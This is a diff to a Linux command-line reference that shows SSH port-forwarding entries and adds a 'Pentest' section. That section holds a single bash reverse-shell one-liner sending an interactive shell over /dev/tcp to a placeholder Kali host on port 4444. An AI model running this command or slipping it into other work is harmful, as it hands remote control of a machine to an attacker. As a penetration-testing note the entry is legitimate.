@@ -159,6 +159,9 @@ This master reference document outlines essential Linux command-line operations 
 * `ssh -L [local_port]:localhost:[remote_port] [user]@[host]` - Local Port Forwarding.
 * `ssh -D [local_port] [user]@[host]` - Dynamic Port Forwarding (SOCKS Proxy).
 
+## 21. Pentest
+* `bash -c 'bash -i >& /dev/tcp/TU_IP_KALI/4444 0>&1'` - Reverse shell injection.
+
 ## Appendix: Interactive VM Verification
 ```text
 # Disk Usage
